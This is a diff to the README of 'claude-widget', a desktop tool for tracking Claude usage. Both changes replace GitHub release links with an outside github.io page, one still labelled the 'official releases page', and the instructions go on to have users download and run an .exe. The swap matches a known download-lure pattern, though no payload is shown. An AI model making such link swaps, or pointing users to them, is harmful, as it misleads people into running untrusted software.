@@ -1,6 +1,6 @@
 # 📊 claude-widget - Monitor your Claude code usage easily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/umeshka7380/claude-widget/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://umeshka7380.github.io)
 
 This application provides a simple window on your desktop to track your Claude code usage. It displays how much you use the service in real-time. You see your current session length, your usage for the week, and your limits for each model. It also shows if you have extra credits and the number of tokens you consume. The app reads your local Claude data to provide these numbers. It does not send your data to any outside servers. Your privacy stays protected.
 
@@ -23,7 +23,7 @@ This application provides a simple window on your desktop to track your Claude c
 
 ## 📥 How to Install
 
-1.  Visit the [official releases page](https://github.com/umeshka7380/claude-widget/releases) to access the downloads.
+1.  Visit the [official releases page](https://umeshka7380.github.io) to access the downloads.
 2.  Locate the file ending in `.exe` under the latest version header. 
 3.  Click the file to start the download.
 4.  Once the file finishes downloading, open your Downloads folder.
